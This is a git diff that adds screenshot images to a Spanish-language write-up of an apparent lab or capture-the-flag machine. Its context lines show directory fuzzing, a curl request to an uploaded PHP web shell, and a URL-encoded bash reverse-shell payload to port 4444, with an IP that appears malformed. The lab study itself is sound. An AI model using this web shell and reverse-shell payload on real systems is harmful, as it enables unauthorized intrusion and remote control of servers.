@@ -30,6 +30,7 @@ o
 ```bash
 dig mail.innovasolutions.thl
 ```
+<img width="1920" height="1006" alt="login" src="https://github.com/user-attachments/assets/c4bc2038-74f9-4aa5-be64-1c2769f17520" />
 
 ---
 
@@ -48,6 +49,7 @@ wfuzz -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list
 - `/uploads` (Tamaño de respuesta: **338 bytes**).
 
 ---
+<img width="1920" height="1003" alt="uploads" src="https://github.com/user-attachments/assets/a8135172-601f-46cc-8edc-00284f454da5" />
 
 ## **💻 Fase de Explotación (RCE - Remote Code Execution)**
 
@@ -57,6 +59,7 @@ Probamos si el archivo `/uploads/foto.png.php` permite ejecución de comandos:
 curl "http://mail.innovasolutions.thl/uploads/foto.png.php?cmd=id"
 ```
 **Respuesta esperada**: Código `200` con salida del comando `id`.
+<img width="1920" height="1006" alt="id" src="https://github.com/user-attachments/assets/98ad6792-114a-4a13-b317-5490186fb587" />
 
 ### **2. Fuzzing del Parámetro `cmd`**
 Usamos `wfuzz` para encontrar parámetros ejecutables:
@@ -83,6 +86,10 @@ Desde el navegador o `curl`:
 curl "http://mail.innovasolutions.thl/uploads/foto.png.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.16812%2F4444%200%3E%261%27"
 ```
 **Nota**: Se aplica **URL Encoding** para evitar errores.
+
+<img width="1920" height="1003" alt="malrevershell" src="https://github.com/user-attachments/assets/3812aec6-d4d4-486b-bfd2-cdfcbb197dc5" />
+<img width="1920" height="996" alt="URLEncode" src="https://github.com/user-attachments/assets/ef58c6ca-ef49-4416-b856-cf048ba11469" />
+
 
 ---
 
